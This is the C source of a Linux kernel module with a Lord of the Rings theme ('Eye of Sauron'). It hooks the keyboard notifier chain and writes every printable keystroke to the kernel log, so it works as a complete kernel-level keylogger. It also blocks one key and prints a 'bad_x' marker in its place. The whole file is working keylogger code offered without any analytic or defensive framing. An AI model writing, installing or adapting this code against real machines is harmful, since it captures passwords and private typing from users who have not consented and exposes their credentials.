#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/keyboard.h>
#include <linux/notifier.h>

MODULE_AUTHOR("geno");
MODULE_LICENSE("GPL");

static int start_eye(void);
static void end_eye(void);
static int sauron_notify(struct notifier_block *nb, unsigned long code, void *data);

module_init(start_eye);
module_exit(end_eye);

static struct notifier_block _sauron =
{
    .notifier_call = sauron_notify,
    .priority = 99
};

static int start_eye(void)
{
    register_keyboard_notifier(&_sauron);
    printk("The Eye of Sauron is upon you.\n");

    return 0;
}

static void end_eye(void)
{
    unregister_keyboard_notifier(&_sauron);
    printk("You are free from the Eye.\n");
}

static int sauron_notify(struct notifier_block *nb, unsigned long code, void *raw_data)
{
    struct keyboard_notifier_param *data = raw_data;
    char c = data->value;

    if (code == KBD_KEYSYM && data->down)
    {
        if (c == 0x01)
            printk("\n");
        else if (c >= 0x20 && c < 0x7f)
            printk(KERN_CONT "%c", c);
    }
    else if (code == KBD_KEYCODE && data->down)
    {
        if (c == 0x2d)
        {
            printk(KERN_CONT "bad_x");
            return NOTIFY_STOP;
        }
    }

    return NOTIFY_OK;
}
